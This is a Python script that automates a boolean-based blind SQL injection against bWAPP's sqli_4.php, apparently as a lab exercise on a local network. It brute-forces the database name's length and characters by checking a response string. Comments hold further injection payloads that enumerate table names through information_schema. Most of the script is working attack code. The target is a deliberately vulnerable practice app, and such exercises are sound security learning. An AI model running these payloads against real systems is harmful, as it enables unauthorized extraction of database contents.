import requests

cookies = {"PHPSESSID":"q4qvd15jqqbdi85fn80s7favq2", "security_level":"0"}
url = "http://192.168.0.14/sqli_4.php?title="
word_list = "abcdefghijklmnopqrstuvwz"
database = ""

# find database length
for x in range(0,50):
    payload = f"{url}%27+or+if%28%28length%28%28select+database%28%29%29%29%3D{x}%29%2C1%2C0%29%23&action=search"
    response = requests.get(payload, cookies=cookies)
    if (response.text.find("The movie exists in our database!") > -1 ):
            print("database length:",x)


# find database name
for j in range(1,x+1):
    for i in word_list:
        payload = f"{url}%27+or+if%28%28substring%28%28select+database%28%29%29%2C{j}%2C1%29%3D%27{i}%27%29%2C1%2C0%29%23&action=search"
        #print("URL: ",url)
        response = requests.get(payload, cookies=cookies)
        #print(response.text)
        if (response.text.find("The movie exists in our database!") > -1 ):
            print("find",j,"th value:",i)
            database = database +i
print("database name:",database)

# find tables
#3중 for문을 써야할듯?

#' or if((length((select database()))=5),1,0)#
#' or if((substring((select database()),{num},1)='{char}'),1,0)#
#' or if((substring((select table_name from information_schema.tables where table_schema='bWAPP' limit 0,1),1,1)='b'),1,0)#
#%27+or+if%28%28substring%28%28select+table_name+from+information_schema.tables+where+table_schema%3D%27bWAPP%27+limit+{j}%2C1%29%2C{i}%2C1%29%3D%27{char}%27%29%2C1%2C0%29%23&action=search 
#' or if((substring((select table_name from information_schema.tables where table_schema='bWAPP' limit {j},1),{i},1)='{char}'),1,0)#

 